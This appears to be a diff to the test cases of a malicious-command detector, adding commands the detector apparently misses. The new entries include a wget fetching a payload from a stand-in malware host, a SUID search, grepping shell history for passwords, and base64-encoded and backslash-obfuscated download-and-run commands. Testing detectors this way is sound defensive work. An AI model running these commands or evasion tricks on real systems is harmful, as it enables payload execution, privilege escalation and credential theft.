@@ -90,7 +90,12 @@ if __name__ == "__main__":
     # Test cases
     test_commands = [
         "ls",  # Clean
-        "wget http://malware.com/payload.sh",  # Malicious
+        "wget http://malware.com/payload.sh",  # Malicious (Already caught?)
+        "find / -perm -4000 2>/dev/null",  # FN: SUID
+        "history | grep pass",  # FN: Credential Access
+        "find / -name \"*.conf\" 2>/dev/null",  # FN: Discovery
+        "echo \"d2dldCBodHRwOi8vbWFsd2FyZS5jb20=\" | base64 -d | bash",  # FN: Base64
+        "w\\ge\\t http://malware.com",  # FN: Obfuscation
     ]
 
     for cmd in test_commands:
